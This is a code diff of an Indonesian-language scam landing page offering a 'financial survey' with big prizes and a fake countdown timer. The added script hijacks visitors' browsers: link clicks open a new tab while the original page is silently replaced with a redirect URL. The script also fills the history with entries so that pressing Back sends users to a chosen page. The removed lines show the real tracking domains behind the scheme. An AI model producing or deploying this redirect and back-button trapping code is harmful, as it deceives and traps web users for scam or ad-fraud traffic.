@@ -4,6 +4,12 @@
   <meta name="pushsdk" content="a5034e6c68d4cb6a8cb95680f3fe3649">
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
   <meta name="viewport" content="initial-scale=1,maximum-scale=1,user-scalable=no" />
+  <script>
+    var cta = 'mainButton';
+    var back = 'https://yahoo.com';
+    var under = 'https://google.com';
+  </script>
+
   <title>Tes survei keuangan $$$</title>
   <link rel="icon" href="favicon.png" />
   <style>
@@ -74,7 +80,9 @@
     <p>Jawab pertanyaan keuangan ini dan <span class="">MENANG BESAR!</span></p>
     <p class="bold">PENAWARAN HANYA BERLAKU UNTUK:</p>
     <p class="timer" id="timer">01:59</p>
-    <div class="button bold" onclick="go()">AWAL</div>
+    <div class="button bold"><a href="www.baidu.com">AWAL</a>
+    </div>
+
   </div>
   <script src="script.js" type="application/javascript"></script>
   <script type="text/javascript">
@@ -95,10 +103,26 @@
     document.head.appendChild(s);
   </script>
   <script>
-    var back = 'https://track.toackeerby.shop/cwdhl0k.php?lp=1&to_offer1';
-    var under = 'https://track.toackeerby.shop/cwdhl0k.php?lp=1&to_offer2';    
+    if (typeof under !== "undefined" && under !== null) {
+      if (typeof cta !== "undefined" && cta !== null) {
+        document.addEventListener('click', function (event) {
+          var target = event.target; while (target) {
+            if (target.tagName === 'A' && target.classList.contains(cta)) { const linkHref = target.href; event.preventDefault(); window.open(linkHref, '_blank'); window.location.replace(under); break; }
+            target = target.parentNode;
+          }
+        });
+      } else {
+        document.addEventListener('click', function (event) {
+          var target = event.target; while (target) {
+            if (target.tagName === 'A') { const linkHref = target.href; event.preventDefault(); window.open(linkHref, '_blank'); window.location.replace(under); break; }
+            target = target.parentNode;
+          }
+        });
+      }
+    }
+    if (typeof back !== "undefined" && back !== null) { !(function () { var t; try { const URL = window.location.href.split(/[#]/)[0]; for (t = 0; 10 > t; ++t)history.pushState({}, '', URL + '#'); onpopstate = function (event) { event.state && location.replace(back); }; } catch (o) { console.log(o); } })(); }
+
   </script>
-  <script src="https://backunder.com/script.js"></script>
 </body>
 
 </html>
